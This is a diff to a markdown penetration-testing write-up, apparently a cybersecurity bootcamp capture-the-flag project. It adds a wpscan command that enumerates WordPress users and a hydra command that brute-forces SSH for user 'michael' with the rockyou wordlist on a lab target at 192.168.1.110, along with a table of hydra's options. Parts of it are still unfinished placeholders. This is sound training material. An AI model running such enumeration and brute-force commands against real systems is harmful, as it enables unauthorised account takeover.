@@ -48,11 +48,31 @@ The target1 has been discovered to be vulnerable to exploit in a variety of ways
 
 - Target 1
   - Command used to enumerate user and check all vulnerable theme, outdated plugin on the wordpress site:
+  
   ```bash
   $ wpscan --url http://192.168.1.110/wordpress --rua --enumerate u
   ```
-  - After runnind this command, we are able to get the information of users from this site.
+  - After running this command, we are can see that this wordpress site username is exposed to the public.
 ![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/Screenshot%20(234).png)  
+
+  - Since the target1 is vulnerable to ssh-bruteforcing, we can use hydra to run the password list against the username to login, in this case we will try with michael
+
+```bash
+  $ hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 -t 4 ssh
+```
+
+## Command Explain
+
+| Options | Description                                                                |
+|---------|----------------------------------------------------------------------------|
+| hydra   | A very fast network logon cracker which support many different services    |
+| -l      | Login - or -L FILE login with LOGIN name, or load several logins from FILE |
+| -p      | PASS - or -P FILE try password PASS, or load several passwords from FILE   |
+| -t      | TASKS - run TASKS number of connects in parallel (default: 16)             |
+
+![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/hydra_bruteforce_ssh.png)
+   
+  - After we optained the credential, we can begin loging into the target using SSH.
   - `flag1.txt`: _TODO: Insert `flag1.txt` hash value_
     - **Exploit Used**
       - _TODO: Identify the exploit used_
